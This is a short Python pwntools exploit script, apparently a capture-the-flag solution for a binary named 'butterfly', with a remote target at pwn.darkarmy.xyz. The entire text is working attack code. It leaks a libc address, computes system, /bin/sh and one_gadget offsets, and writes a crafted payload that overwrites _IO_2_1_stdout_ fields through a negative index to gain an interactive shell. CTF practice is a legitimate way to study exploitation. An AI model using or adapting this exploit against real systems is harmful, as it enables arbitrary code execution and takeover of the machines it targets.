from pwn import *
local = 1
if local:
    s= process("./butterfly")
    offset_local = 0x5f0000
    raw_input('debug')
    magic_offset = 0x5f09d8
    one_gadget = [0x45226,0x4527a,0xf0364,0xf1207]
else:
    s = remote('pwn.darkarmy.xyz', 32770)
    offset_server = 0x61a000
sub_main = 0x000555555554A4B
payload = "aaaaaaa"
s.sendlineafter("I need your name: ",payload)
s.recvuntil('\n')
leak = u64(s.recv(6)+'\x00'*2)
log.info("Leak: 0x%x"%(leak))
base = leak - magic_offset
system_off = 0x453a0
binsh_off = 0x18ce17
system = base + system_off
binsh = base + binsh_off
one = base + one_gadget[2]
i_o_stdout = base + 0x3c5620
payload = p64(0x0) + 'a'*0x30 + p64(one)
payload = payload.ljust(0x88,'a') + p64(i_o_stdout)
payload = payload.ljust(0xc0,'a') + p64(0x00000000ffffffff)
payload = payload.ljust(0xd8,'a') + p64(i_o_stdout)
s.sendlineafter("Enter the index of the you want to write: ",str(-6))
s.sendlineafter("Enter data: ",payload)
s.interactive()
s.close()
# overflow 